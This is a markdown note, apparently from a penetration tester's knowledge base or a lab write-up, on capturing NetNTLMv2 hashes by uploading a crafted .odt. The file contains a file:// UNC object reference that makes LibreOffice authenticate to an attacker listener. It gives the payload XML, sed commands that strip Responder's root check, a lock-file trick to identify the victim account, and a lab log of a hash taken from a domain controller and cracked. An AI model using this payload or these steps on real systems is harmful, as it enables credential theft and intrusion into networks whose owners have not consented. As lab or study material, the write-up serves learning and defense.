# Bad-ODF: Document-Based NetNTLM Capture via OLE UNC Object References

A way to capture a live NetNTLMv2 authentication from whatever process/account
opens an uploaded document, using a passive rendering feature rather than a
macro — meaning it works even against a document-processing pipeline that
disables/blocks macros entirely.

## The mechanism

An ODF (`.odt`) container is a zip of XML parts. `content.xml` can embed a
`draw:frame`/`draw:object` whose `xlink:href` is a `file://<host>/<name>` URL:

```xml
<draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph"
            svg:width="14.101cm" svg:height="9.999cm" draw:z-index="0">
  <draw:object xlink:href="file://<LISTENER_IP>/test.jpg" xlink:type="simple"
               xlink:show="embed" xlink:actuate="onLoad"/>
  <draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple"
              xlink:show="embed" xlink:actuate="onLoad"/>
</draw:frame>
```

When a LibreOffice/OpenOffice-family renderer resolves that reference (even
just rendering/previewing the document, no macro execution involved), it
treats the two-slash `file://` authority as a UNC host and issues an outbound
SMB connection to `\\<ip>\<name>` — carrying the rendering process's own NTLM
authentication. Zero user interaction beyond the document being
opened/converted; this fires even in headless `--convert-to`-style automated
pipelines that have no interactive UI at all.

Original technique: a 2018 LibreOffice/OpenOffice `.odt` Information
Disclosure PoC by Richard Davy (exploit-db 44564). Modern Python3
reimplementation: [lof1sec/Bad-ODF](https://github.com/lof1sec/Bad-ODF)
(depends on `ezodf`).

## Building the payload without the upstream dependency

The upstream tool's `ezodf` dependency is avoidable — a minimal, spec-valid
ODF container is just five parts built with stdlib `zipfile` (`mimetype`
first entry, stored uncompressed; `META-INF/manifest.xml`; `content.xml`
with the payload above; `styles.xml`; `meta.xml`). A ~1.6KB file, comfortably
under most upload-size caps.

## Capturing the hash without root

Responder (and most SMB-capture listeners) hard-require `os.geteuid() == 0`.
Two things can make a non-root capture listener viable without any real
privilege escalation on the attack box:

1. Check `cat /proc/sys/net/ipv4/ip_unprivileged_port_start` — if it's `0`,
   any unprivileged user can bind any TCP port, including 445/139/389/80.
   This is a sandbox/environment configuration fact to check, not something
   to assume.
2. Responder's own root check is a single hardcoded guard in `Responder.py`.
   Copy the package to a scratch directory (never touch the real system
   install) and neutralize just that check:

```bash
cp -r /usr/share/responder/* /tmp/responder_local/
sed -i 's/if not os.geteuid() == 0:/if False:/' /tmp/responder_local/Responder.py
# disable HTTPS in the copied Responder.conf if the private key isn't readable by this user
python3 /tmp/responder_local/Responder.py -I <vpn-iface> -v
```

Clear `/tmp/responder_local/logs/*` before starting if the copy was seeded
from a shared system install's log directory — a stale capture from an
unrelated prior engagement sitting in the log directory is easy to
misattribute to the current target if not checked first.

## Positively identifying the consumer, not just timing it

Once the hash lands, don't stop at "some process opened it." If the upload
channel also grants any file-share read access to the destination directory,
check for a live lock file — LibreOffice's own `.~lock.<docname>#` format
states the opening account, hostname, and profile path in plain text:

```
$ cat ".~lock.<uuid>.odt#"
,DOMAIN/user,hostname,<timestamp>,file:///C:/Users/<user>/AppData/Roaming/LibreOffice/4;
```

This is strictly more reliable than inferring the consumer's identity from
capture timing/cadence alone, and directly tells you whether it's worth
pursuing document-macro RCE against the same pipeline next (a materially
higher-value target if the consuming process runs directly on a domain
controller or other Tier-0 host).

## What this does *not* get you

The captured NetNTLMv2 hash is only as strong as whatever cracks it (rockyou,
targeted wordlists) or whatever it can be relayed to — it is not, by itself,
code execution. If the consuming environment is confirmed headless/
`--convert-to`-style (no interactive dialog to click through), a
macro-enabled document bound to the `dom:load`/"Open Document" event is worth
trying as a follow-on for real code execution, but expect it to be blocked by
the headless mode's own default macro-execution policy rather than an
interactive security-warning prompt — a structurally different blocker than
the classic "user has to click Enable Macros" gate.

## Seen on

- [[hercules#Foothold|Hercules]] — captured `HERCULES\natalie.a`'s NetNTLMv2
  hash within 33 seconds of uploading a Bad-ODF `.odt` through a
  forged-Forms-Authentication-ticket upload gate, cracked against rockyou in
  11 seconds. The lock-file read confirmed the consuming process was
  LibreOffice, running as `natalie.a`, directly on the domain controller — a
  materially more valuable target than the upload identity itself. A
  follow-on macro-based RCE attempt against the same pipeline was tried and
  came back a clean negative, consistent with the headless-mode
  macro-policy theory above (root was ultimately reached via an unrelated
  ACL chain instead).
